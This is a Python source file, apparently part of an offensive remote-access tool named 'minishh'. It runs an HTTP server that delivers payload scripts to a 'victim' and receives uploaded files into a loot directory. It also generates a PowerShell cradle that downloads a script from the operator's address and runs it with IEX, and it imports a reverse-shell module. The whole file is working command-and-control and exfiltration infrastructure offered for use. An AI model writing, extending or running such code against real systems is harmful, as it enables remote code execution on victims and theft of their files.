from http.server import BaseHTTPRequestHandler, HTTPServer
from http import HTTPStatus
from enum import Enum, auto
from threading import Thread, Event
import os
import requests
from utils.minishh_utils import MinishhUtils
from utils.pwsh_utils import ReverseShell
from utils.print_utils import Printer
from config.config import AppConfig

CRLF = b"\r\n\r\n"

class ServerStatus(Enum):
    Running = auto()
    Stopped = auto()

class StateDownload(Enum):
    """
    Enum used to notify the download status
    """
    WAIT_FOR_BOUNDARY = auto()
    WAIT_FOR_CRLF = auto()
    WAIT_FOR_END_BOUNDARY = auto()


class HttpDeliveringServer(BaseHTTPRequestHandler):

    files_to_deliver = {"tmp_routes": {}, "permanent_routes": {}}
    files_to_receive = {}

    def __init__(self, *args, **kwargs):
        self.server_version = "MinishhHttp/0.8"
        self.sys_version = ''
        self.buff_size = 65536
        super().__init__(*args, **kwargs)

    @classmethod
    def notify_upload(cls, route, filename):
        cls.files_to_receive[route] = filename

    @classmethod
    def remove_file_upload(cls, route):
        if route in cls.files_to_receive:
            del cls.files_to_receive[route]

    @classmethod
    def notify_download(cls, route, filename):
        cls.files_to_deliver["tmp_routes"][route] = filename

    @classmethod
    def remove_file(cls, route):
        if route in cls.files_to_deliver["tmp_routes"]:
            del cls.files_to_deliver["tmp_routes"][route]

    @classmethod
    def init_permanent_route(cls, routes):
        cls.files_to_deliver["permanent_routes"] = routes

    @classmethod
    def add_permanent_route(cls, route, file):
        cls.files_to_deliver["permanent_routes"][route] = file

    @classmethod
    def get_route_for_script(cls, script_name):
        for k,v in cls.files_to_deliver["permanent_routes"].items():
            if v == script_name:
                return k
        return None

    def do_GET(self):
        filename = None
        self.path = self.path.lstrip("/")
        if self.path in HttpDeliveringServer.files_to_deliver["tmp_routes"]:
            filename = HttpDeliveringServer.files_to_deliver["tmp_routes"].get(self.path)
        else:
            filename = HttpDeliveringServer.files_to_deliver["permanent_routes"].get(self.path)

        if(filename is not None and os.path.isfile(filename)):
            try:
                with open(filename, "r") as f:
                    fs = os.fstat(f.fileno())

                content = b""
                with open(filename, "rb") as file:
                    content = file.read()

                self.send_response(HTTPStatus.OK)
                self.send_header("Content-Length", str(fs[6]))
                self.end_headers()

                self.wfile.write(content)

                # Once download done, remove the file from the temp route
                self.remove_file(self.path)

            except Exception as e:
                Printer.verr(e)
                self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR)
                self.send_header("Content-Length", "0")
                self.end_headers()

        else:
            self.send_response(HTTPStatus.NOT_FOUND)
            self.send_header("Content-Length", "0")
            self.end_headers()

    def do_POST(self):
        """
        Method allowing file transfer between minishh server and the victim
        This method download file from post method

        It works with and without multipart
        """
        try:
            loot_dir = AppConfig.get("directory", "Download")
            if not os.path.isdir(loot_dir):
                raise ValueError("Download dir not found...")


            content_type = self.headers.get("Content-Type")
            file_length = int(self.headers['Content-Length'])
            filename = HttpDeliveringServer.files_to_receive.get(self.path.lstrip("/"))
            filepath = os.path.join(loot_dir, os.path.basename(filename))

            if (content_type is not None and 'boundary=' in content_type and filename):
                boundary = content_type.split("boundary=")[-1]
                beginning = f"--{boundary}\r\n".encode()
                end_boundary = f"\r\n--{boundary}--".encode()
                readed_bytes = 0

                state = StateDownload.WAIT_FOR_BOUNDARY
                state_buffer = b""
                start_boundary = 0

                with open(filepath, "wb") as f:
                    while readed_bytes < file_length:
                        data = self.rfile.read(min(self.buff_size, file_length - readed_bytes))
                        readed_bytes += len(data)

                        if state is StateDownload.WAIT_FOR_BOUNDARY:
                            start_boundary = data.find(beginning)
                            if start_boundary != -1:
                                state = StateDownload.WAIT_FOR_CRLF

                        if state is StateDownload.WAIT_FOR_CRLF:
                            crlf_pos = data.find(CRLF)
                            if crlf_pos != -1:
                                state = StateDownload.WAIT_FOR_END_BOUNDARY
                                state_buffer = data[crlf_pos + len(CRLF):]

                        if state is StateDownload.WAIT_FOR_END_BOUNDARY:
                            if state_buffer:
                                end_boundary_pos = state_buffer.find(end_boundary)
                                if end_boundary_pos != -1:
                                    f.write(state_buffer[:end_boundary_pos])
                                    break

                                f.write(state_buffer)
                                state_buffer = b""

                            else:
                                end_boundary_pos = data.find(end_boundary)

                                if end_boundary_pos != -1:
                                    Printer.vlog(f"File download ended")
                                    f.write(data[:end_boundary_pos])
                                    break

                                f.write(data)

                    Printer.log(f"File saved in [yellow]{filepath}[/yellow]")

                self.send_response(HTTPStatus.OK)
                self.send_header("Content-Length", "0")
                self.end_headers()

            else:
                self.send_response(HTTPStatus.NOT_FOUND)
                self.send_header("Content-Length", "0")
                self.end_headers()

            self.remove_file_upload(self.path.lstrip("/"))

        except Exception as e:
            # Printer.exception()
            Printer.err(e)
            self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR)
            self.send_header("Content-Length", "0")
            self.end_headers()
            pass

    def log_message(self, format, request_proto, status_code, *args):
        if isinstance(request_proto, str):
            splited_req = request_proto.split()
            verb = splited_req[0]
            route = request_proto
            if len(splited_req) >= 2:
                route = splited_req[1]

            if(int(status_code) == HTTPStatus.OK and verb == "GET"):
                Printer.log(f'File downloaded successfully from [blue]{self.address_string()}[/blue] -->  [yellow]{route}[/yellow]')


class HttpServer(Thread):
    """
    Class responsible for building payload and creating route for futur download
    """
    def __init__(self):
        super().__init__(name="HttpServerThread")
        self.host = "127.0.0.1"
        self.port = int(AppConfig.get("port", "HttpServer"))
        self.server_status = ServerStatus.Stopped
        self.has_started = Event()
        self.httpd = None

    def __str__(self):
        return f"HttpServer(port={self.port}, status={self.server_status.name})"

    def notify_download(self, route, filename):
        if self.server_status == ServerStatus.Running:
            HttpDeliveringServer.notify_download(route, filename)
        else:
            Printer.err("Http server is not running...")

    def add_permanent_route(self, route, script_name):
        HttpDeliveringServer.add_permanent_route(route, script_name)

    def download_link_powershell(self, route):
        http_route = self.create_download_link(route)
        return f"""(new-object System.Net.Webclient).downloadstring("{http_route}")|IEX"""

    @staticmethod
    def get_download_address():
        """
        Return the download ip:port to use
        """
        port = AppConfig.get("default_port", default=AppConfig.get("listening_port", "Connections"))
        ip_address = AppConfig.get("default_ip_address")
        return (ip_address, port)

    @classmethod
    def create_download_link(cls, route):
        ip_addr = AppConfig.get("default_ip_address")
        port = AppConfig.get("default_port", default=AppConfig.get("listening_port", "Connections"))
        return f'http://{ip_addr}:{port}/{route}'

    def end_download(self, route):
        HttpDeliveringServer.remove_file(route)

    @property
    def is_listening(self):
        return self.server_status == ServerStatus.Running

    def stop_listening(self):
        self.server_status = ServerStatus.Stopped
        try:
            Printer.vlog("Closing HTTP server..")
            requests.get(f"http://{self.host}:{str(self.port)}", timeout=1)
        except:
            pass

    def run(self):
        try:
            self.httpd = HTTPServer((self.host, self.port), HttpDeliveringServer)
            self.server_status = ServerStatus.Running
            Printer.log(f"Http server started on {self.host}:{self.port}")

        except Exception as e:
            self.server_status = ServerStatus.Stopped
            Printer.err(e)

        finally:
            self.has_started.set()

        while self.server_status == ServerStatus.Running:
            self.httpd.handle_request()
